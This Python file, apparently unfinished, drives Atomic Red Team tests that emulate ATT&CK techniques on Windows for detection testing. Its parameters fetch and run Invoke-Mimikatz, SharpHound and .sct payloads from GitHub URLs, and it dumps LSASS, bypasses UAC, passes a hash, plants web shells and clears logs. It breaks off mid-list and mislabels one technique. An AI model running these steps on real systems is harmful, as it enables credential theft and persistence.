# Imports runner.py, sets variables and executes scripts

# TODO:
# Finish populating windows tests
# Add logic to clean memory after every couple of tests
# Populate Linux/Mac tests (low pri)

import runner

def main():

    # Instantiate the AtomicRunner class instance.
    techniques = runner.AtomicRunner()

    # T1003 - Credential Dumping
    techniques.execute("T1003", position=0, parameters={'remote_script': 'https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'})
    techniques.execute("T1003", position=1, parameters={})
    techniques.execute("T1003", position=2, parameters={'output_file': 'C:\\atomic_red_team_results\\t1003-p2-output.txt'})
    techniques.execute("T1003", position=3, parameters={})
    techniques.execute("T1003", position=4, parameters={'output_file': 'C:\\atomic_red_team_results\\t1003-p4-lsass_dump.dmp'})
    techniques.execute("T1003", position=5, parameters={'output_folder': 'C:\\atomic_red_team_results\\t1003-p5-dump'})

    # T1004 - Winlogon Helper DLL
    techniques.execute("T1004", position=0, parameters={'binary_to_execute': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1004", position=1, parameters={'binary_to_execute': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1004", position=2, parameters={'binary_to_execute': 'C\\Windows\\Temp\\atomicNotificationPackage.dll'})

    # T1005 - Data from Local System
    #techniques.execute("T1005", position=0, parameters={})  #Linux/Mac technique

    # T1007 - System Service Discovery
    techniques.execute("T1007", position=0, parameters={'service_name': 'svchost.exe'})
    techniques.execute("T1007", position=1, parameters={'output_file': 'C:\\atomic_red_team_results\\t1007-p1-output.txt'})

    # T1009 - Binary Padding
    #techniques.execute("T1009", position=0, parameters={})  #Linux/Mac technique

    # T1010 - Application Window Discovery
    techniques.execute("T1010", position=0, parameters={'input_source_code': "C:\\AtomicRedTeam\\atomics\T1010\src\T1010.cs", 'output_file_name': 'C:\\atomic_red_team_results\\T1010.exe'})

    # T1012 - Query Registry
    techniques.execute("T1012", position=0, parameters={})

    # T1014 - Loadable Kernel Module Based Rootkit
    techniques.execute("T1014", position=0, parameters={'driver_path': 'C:\\Drivers\\driver.sys'})

    # T1015 - Accessibility Features
    techniques.execute("T1015", position=0, parameters={'target_executable': 'osk.exe'})
    techniques.execute("T1015", position=1, parameters={'target_executable': 'sethc.exe'})
    techniques.execute("T1015", position=2, parameters={'target_executable': 'utilman.exe'})
    techniques.execute("T1015", position=3, parameters={'target_executable': 'magnify.exe'})
    techniques.execute("T1015", position=4, parameters={'target_executable': 'narrator.exe'})
    techniques.execute("T1015", position=5, parameters={'target_executable': 'DisplaySwitch.exe'})
    techniques.execute("T1015", position=6, parameters={'target_executable': 'atbroker.exe'})

    # T1016 - System Network Configuration Discovery
    techniques.execute("T1016", position=0, parameters={})

    # T1018 - Remote System Discovery
    techniques.execute("T1018", position=0, parameters={})
    techniques.execute("T1018", position=1, parameters={})
    techniques.execute("T1018", position=2, parameters={})

    # T1022 - Data Encrypted
    techniques.execute("T1022", position=0, parameters={})
    techniques.execute("T1022", position=1, parameters={})
    techniques.execute("T1022", position=2, parameters={})

    # T1027 - Obfuscated Files or Information
    #techniques.execute("T1027", position=0, parameters={})  #Linux/Mac technique

    # T1028 - Windows Remote Management
    # Commenting out tests 2-5, as they are intended to be executed on a remote machine
    # If running tests 2-5, fill in appropriate target, username and password
    techniques.execute("T1028", position=0, parameters={})
    #techniques.execute("T1028", position=1, parameters={'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=2, parameters={'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=3, parameters={'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=4, parameters={'host_name': 'REPLACE-ME', 'remote_command': 'ipconfig'})

    # T1030 - Data Transfer Size Limits
    #techniques.execute("T1030", position=0, parameters={})  #Linux/Mac technique

    # T1031- Modify Existing Service
    techniques.execute("T1031", position=0, parameters={})

    # T1033 - System Owner/User Discovery
    # Commenting out test, as is it intended to be executed on a remote machine
    # If running test, fill in appropriate target
    #techniques.execute("T1033", position=0, parameters={'computer_name': 'REPLACE-ME'})

    # T1035 - Service Execution
    techniques.execute("T1035", position=0, parameters={'service_name': 'ARTService', 'executable_command': '%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType file C:\x07rt-marker.txt'})

    # T1036 - Masquerading
    techniques.execute("T1036", position=0, parameters={})

    # T1037 - Logon Scripts
    techniques.execute("T1037", position=0, parameters={'script_command': 'cmd.exe /c calc.exe'})

    # T1040 - Network Sniffing
    # Commenting out these tests, as they require Wireshark, WinPCAP and windump
    # If running these tests, specify the interface to attach to
    #techniques.execute("T1040", position=0, parameters={'interface': 'REPLACE-ME'})
    #techniques.execute("T1040", position=1, parameters={'interface': 'REPLACE-ME'})

    # T1042 - Change Default File Association
    techniques.execute("T1042", position=0, parameters={'extension_to_change': '.wav', 'target_extension_handler': 'C:\\Program Files\\Windows Media Player\\wmplayer.exe'})

    # T1046 - Network Service Scanning
    #techniques.execute("T1046", position=0, parameters={})  #Linux/Mac technique

    # T1047 - Windows Management Instrumentation
    # Commenting out test 4, as it is intended to be executed on a remote machine
    # If running test 4, fill in appropriate target
    techniques.execute("T1047", position=0, parameters={})
    techniques.execute("T1047", position=1, parameters={})
    techniques.execute("T1047", position=2, parameters={})
    #techniques.execute("T1047", position=3, parameters={"node": 'REPLACE-ME (IP ADDRESS)', 'service_search_string': 'sql server'})

    # T1048 - Exfiltration Over Alternative Protocol
    # Commenting out test, as it requires a destination address to exfil to
    # If running test, fill in path to .txt file and remote exfil IP address
    #techniques.execute("T1048", position=0, parameters={'input_file': 'C:\\REPLACE-ME', 'ip_address': 'REPLACE-ME'})

    # T1049 - System Network Connections Discovery
    techniques.execute("T1049", position=0, parameters={})
    techniques.execute("T1049", position=1, parameters={})

    # T1050 - Service Installation
    techniques.execute("T1050", position=0, parameters={'binary_path': 'C:\\AtomicRedTeam\\atomics\\T1050\\bin\\AtomicService.exe', 'service_name': 'AtomicTestService'})
    techniques.execute("T1050", position=1, parameters={'binary_path': 'C:\\AtomicRedTeam\\atomics\\T1050\\bin\\AtomicService.exe', 'service_name': 'AtomicTestService'})

    # T1053 - Scheduled Task
    # Commenting out test 3, as it is intended to be executed on a remote machine
    # If running test 3, fill out appropriate target, username and password
    techniques.execute("T1053", position=0, parameters={})
    techniques.execute("T1053", position=1, parameters={'task_command': 'C:\\Windows\\system32\\cmd.exe', 'time': '1210'})
    #techniques.execute("T1053", position=2, parameters={'task_command': 'C:\\Windows\\system32\\cmd.exe', 'time': '1210', 'target': 'REPLACE-ME', 'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME'})

    # T1055 - Process Injection
    techniques.execute("T1055", position=0, parameters={'dll_payload': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll', 'process_id': '$pid'})
    techniques.execute("T1055", position=1, parameters={'dll_payload': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll', 'process_id': '$pid'})
    techniques.execute("T1055", position=2, parameters={'exe_binary': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll',})

    # T1056 - Input Capture
    techniques.execute("T1056", position=0, parameters={'filepath': 'C:\\atomic_red_team_results\\t1056-key.log'})

    # T1057 - Process Discovery
    #techniques.execute("T1057", position=0, parameters={})  #Linux/Mac technique

    # T1059 - Command-Line Interface
    #techniques.execute("T1059", position=0, parameters={})  #Linux/Mac technique

    # T1060 - Registry Run Keys / Start Folder
    techniques.execute("T1060", position=0, parameters={'command_to_execute': 'C:\\Path\\AtomicRedTeam.exe'})
    techniques.execute("T1060", position=1, parameters={'thing_to_execute': 'C:\\Path\\AtomicRedTeam.dll'})
    techniques.execute("T1060", position=2, parameters={'thing_to_execute': 'powershell.exe'})
    techniques.execute("T1060", position=3, parameters={'thing_to_execute': 'C:\\Path\\AtomicRedTeam.exe'})

    # T1062 - Hypervisor
    # Commenting out test, as it requires a hostname
    # If running test, fill out hostname field
    #techniques.execute("T1062", position=0, parameters={'hostname': 'REPLACE-ME', 'vm_name': 'testvm', 'file_location': 'C:\\Temp\\test.vhdx'})

    # T1063 - Security Software Discovery
    techniques.execute("T1063", position=0, parameters={})
    techniques.execute("T1063", position=1, parameters={})
    techniques.execute("T1063", position=2, parameters={})

    # T1064 - Scripting
    #techniques.execute("T1064", position=0, parameters={})  #Linux/Mac technique

    # T1065 - Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls
    techniques.execute("T1065", position=0, parameters={'port': '8081', 'domain': 'google.com'})

    # T1069 - Permission Groups Discovery
    techniques.execute("T1069", position=0, parameters={})
    techniques.execute("T1069", position=1, parameters={'user': 'administrator'})

    # T1070 - Indicator Removal on Host
    techniques.execute("T1070", position=0, parameters={'log_name': 'System'})
    techniques.execute("T1070", position=1, parameters={})

    # T1071 - Standard Application Layer Protocol
    techniques.execute("T1071", position=0, parameters={'domain': 'www.google.com'})

    # T1074 - Data Staged
    #techniques.execute("T1074", position=0, parameters={})  #Linux/Mac technique

    # T1075 - Pass the Hash
    techniques.execute("T1075", position=0, parameters={'user_name': "REPLACE-ME", 'domain': 'REPLACE-ME', 'ntlm': 'cc36cf7a8514893efccd3324464tkg1a'})
    techniques.execute("T1075", position=1, parameters={'user_name': "REPLACE-ME", 'domain': 'REPLACE-ME'})

    # T1076 - Remote Desktop Protocol
    techniques.execute("T1076", position=0, parameters={})

    # T1077 - Windows Admin Shares
    # Test commented out, as they require connection to external host or data store
    # If running tests, fill in networking and authentication information
    #techniques.execute("T1077", position=0, parameters={'share_name': 'C$', 'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1077", position=1, parameters={'share_name': 'C$', 'computer_name': 'REPLACE-ME', 'map_name': 'REPLACE-ME (mapped drive letter'})

    # T1081 - Credential in Files
    techniques.execute("T1081", position=0, parameters={})
    techniques.execute("T1081", position=1, parameters={})

    # T1082 - System Information Discovery
    techniques.execute("T1082", position=0, parameters={})

    # T1083 - File and Directory Discovery
    techniques.execute("T1083", position=0, parameters={})
    techniques.execute("T1083", position=1, parameters={})

    # T1084 - Windows Management Instrumentation Event Subscription
    techniques.execute("T1084", position=0, parameters={})
    techniques.execute("T1084", position=1, parameters={})

    # T1085 - Rundll32
    techniques.execute("T1085", position=0, parameters={'file_url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct'})

    # T1086 - PowerShell
    techniques.execute("T1086", position=0, parameters={'mimurl': 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'})
    techniques.execute("T1086", position=1, parameters={'bloodurl': 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'})
    techniques.execute("T1086", position=2, parameters={})
    techniques.execute("T1086", position=3, parameters={})
    techniques.execute("T1086", position=4, parameters={})
    techniques.execute("T1086", position=5, parameters={'user_name': 'atomic_user', 'full_name': 'Atomic Red Team', 'password': 'ATOM1CR3DT3@M', 'description': 'Test user created via powershell using red canary scripts'})
    techniques.execute("T1086", position=6, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
    techniques.execute("T1086", position=7, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
    techniques.execute("T1086", position=8, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml'})
    techniques.execute("T1086", position=9, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct'})
    techniques.execute("T1086", position=10, parameters={})

    # T1087 - Account Discovery
    techniques.execute("T1087", position=0, parameters={})
    techniques.execute("T1087", position=1, parameters={})
    techniques.execute("T1087", position=2, parameters={})
    techniques.execute("T1087", position=3, parameters={})

    # T1088 - Bypass User Account Control
    techniques.execute("T1088", position=0, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1088", position=1, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1088", position=2, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1088", position=3, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})

    # T1090 - Connection Proxy
    #techniques.execute("T1090", position=0, parameters={})  #Linux/Mac technique

    # T1096 - NTFS File Attributes
    techniques.execute("T1096", position=0, parameters={'path': 'C:\\ADS\\'})

    # T1098 - Account Manipulation
    techniques.execute("T1098", position=0, parameters={})

    # T1099 - Timestomp
    techniques.execute("T1099", position=0, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})
    techniques.execute("T1099", position=1, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})
    techniques.execute("T1099", position=2, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})

    # T1100 - Web Shell
    techniques.execute("T1100", position=0, parameters={'web_shell_path': 'C:\\inetpub\\wwwroot', 'web_shells': 'C:\\AtomicRedTeam\\atomics\\T1100\\shells'})

    # T1101 - Security Support Provider
    techniques.execute("T1101", position=0, parameters={'fake_ssp_dll': 'not-a-ssp'})

    # T1103 - AppInit DLLs
    techniques.execute("T1103", position=0, parameters={'registry_file': 'T1103.reg'})

    # T1105 - Remote File Copy
    techniques.execute("T1105", position=0, parameters={'remote_file': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt', 'local_path': 'Atomic-license.txt'})
    techniques.execute("T1105", position=1, parameters={'remote_file': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt', 'local_path': 'Atomic-license.txt'})

    # T1107 - File Deletion
    techniques.execute("T1107", position=0, parameters={'file_to_delete': 'C:\\Windows\\Temp\\victim-files-cmd\\a'})
    techniques.execute("T1107", position=1, parameters={'file_to_delete': 'C:\\Windows\\Temp\\victim-files-cmd'})
    techniques.execute("T1107", position=2, parameters={'file_to_delete': 'C:\\Windows\\Temp\\victim-files-ps\\a'})
    techniques.execute("T1107", position=3, parameters={'file_to_delete': 'C:\\Windows\\Temp\\victim-files-ps'})
    techniques.execute("T1107", position=4, parameters={})
    techniques.execute("T1107", position=5, parameters={})
    techniques.execute("T1107", position=6, parameters={})
    techniques.execute("T1107", position=7, parameters={})

    # T1110 - Brute Force
    # Test commented out because it requires a remote host
    # If running test, ensure remote host field is filled in
    #techniques.execute("T1110", position=0, parameters={'input_file_users': "DomainUsers.txt", 'input_file_passwords': 'passwords.txt', 'remote_host': 'REPLACE-ME', 'domain': 'REPLACE-ME'})

    # T1112 - Modify Registry
    techniques.execute("T1112", position=0, parameters={})
    techniques.execute("T1112", position=1, parameters={})
    techniques.execute("T1112", position=2, parameters={})

    # T1113 - Screen Capture
    #techniques.execute("T1113", position=0, parameters={})  #Linux/Mac technique

    # T1114 - Email Collection
    techniques.execute("T1114", position=0, parameters={})

    # T1115 - Clipboard Data
    techniques.execute("T1115", position=0, parameters={})
    techniques.execute("T1115", position=1, parameters={})

    # T1117 - Regsvr32
    techniques.execute("T1117", position=0, parameters={'filename': 'C:\\AtomicRedTeam\\atomics\\T1117\\RegSvr32.sct'})
    techniques.execute("T1117", position=1, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct'})
    techniques.execute("T1117", position=2, parameters={'dll_name': 'C:\\AtomicRedTeam\\atomics\T1117\\bin\\AllTheThingsx86.dll'})

    # T1118 - InstallUtil
    techniques.execute("T1118", position=0, parameters={'filename': 'T1118.dll'})

    # T1119 - Automated Collection
    techniques.execute("T1119", position=0, parameters={})
    techniques.execute("T1119", position=1, parameters={})

    # T1121 - RegSvcs/RegAsm
    techniques.execute("T1121", position=0, parameters={'file_name': 'T1121.dll', 'source_file': 'C:\\AtomicRedTeam\\atomics\\T1121\\src\\T1121.cs'})
    techniques.execute("T1121", position=1, parameters={'file_name': 'T1121.dll', 'source_file': 'C:\\AtomicRedTeam\\atomics\\T1121\\src\\T1121.cs'})

    # T1122 - Component Object Model Hijacking
    techniques.execute("T1122", position=0, parameters={})

    # T1123 - Audio Capture
    techniques.execute("T1123", position=0, parameters={'output_file': 'test.wma', 'duration_hms': '0000:00:30'})
    techniques.execute("T1123", position=1, parameters={})

    # T1124 - System Time Discovery
    techniques.execute("T1124", position=0, parameters={'computer_name': 'localhost'})
    techniques.execute("T1124", position=1, parameters={})

    # T1126 - Remove Network Share
    techniques.execute("T1126", position=0, parameters={'share_name': '\\test\share'})
    techniques.execute("T1126", position=1, parameters={'share_name': '\\test\share'})
    techniques.execute("T1126", position=2, parameters={'share_name': '\\test\share'})

    # T1127 - Trusted Developer Utilities
    techniques.execute("T1127", position=0, parameters={'filename': 'T1127.csproj'})

    # T1128 - Netsh Helper DLL
    techniques.execute("T1128", position=0, parameters={'helper_file': 'C:\\Path\\file.dll'})

    # T1130 - Install Root Certificate
    #techniques.execute("T1130", position=0, parameters={})  #Linux/Mac technique

    # T1132 - Data Encoding
    #techniques.execute("T1132", position=0, parameters={})  #Linux/Mac technique

    # T1134 - Access Token Manipulation
    techniques.execute("T1134", position=0, parameters={'target_user': 'SYSTEM'})

    # T1135 - Network Share Discovery
    techniques.execute("T1132", position=0, parameters={'computer_name': 'localhost'})
    techniques.execute("T1132", position=1, parameters={'computer_name': 'localhost'})

    # T1136 -







if __name__ == "__main__":
    main()

